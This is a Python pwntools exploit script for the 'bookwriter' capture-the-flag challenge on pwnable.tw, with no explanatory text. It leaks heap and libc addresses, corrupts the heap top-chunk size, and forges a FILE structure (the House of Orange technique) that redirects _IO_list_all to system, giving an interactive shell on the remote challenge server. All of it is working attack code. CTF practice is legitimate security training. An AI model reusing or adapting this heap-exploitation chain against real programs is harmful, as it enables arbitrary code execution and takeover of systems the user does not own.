from pwn import *
elf = ELF("./bookwriter")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")
context.binary=elf
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('chall.pwnable.tw',10304)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def setup(author="A"*0x40):
	sa("Author :",author)

def add(size,data="A"):
	sla("choice :",str(1))
	sla("page :",str(size))
	sa("Content :",data)

def leaks(index):
	sla("choice :",str(2))
	sla("page :",str(index))
	target.recvlines(2)
	leak=u64(target.recvline().strip("\n")[0:6].ljust(8,"\x00"))
	return leak

def edit(index,data):
	sla("choice :",str(3))
	sla("page :",str(index))
	sa("Content:",data)

def info():
	sla("choice :",str(4))
	target.recvuntil("Author : ")
	leak=u64(target.recvline().strip("\n")[0x40:].ljust(8,"\x00"))
	sla("no:0) ",str(0))
	return leak
	
setup()
add(0xff8)#0
heap_base=info()-0x10
print(hex(heap_base))
add(0x1eda8)#1
add(0xf8)#2
edit(2,"A"*0xf8)
edit(2,"A"*0xf8+"\x41\x01")
add(0x150)#3
edit(2,"A"*0xf8+"\x41\x21")
add(0x1210,"\x78")#4
libc_base=leaks(4)-0x3c4278
print(hex(libc_base))
payload="A"*0x78+p64(0xea1)
add(0xf10,payload)#5
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
libc_io_list_all=libc_base+libc.symbols["_IO_list_all"]
libc_system=libc_base+libc.symbols["system"]
add(0xf00)#6
fp=FileStructure(null=libc_malloc_hook)
payload="A"*0x68+p64(libc_system)+fp.orange(libc_io_list_all,heap_base+0x22158-3*8)
edit(5,payload)
sla("choice :",str(1))
sla("page :",str(0x10))
target.interactive()
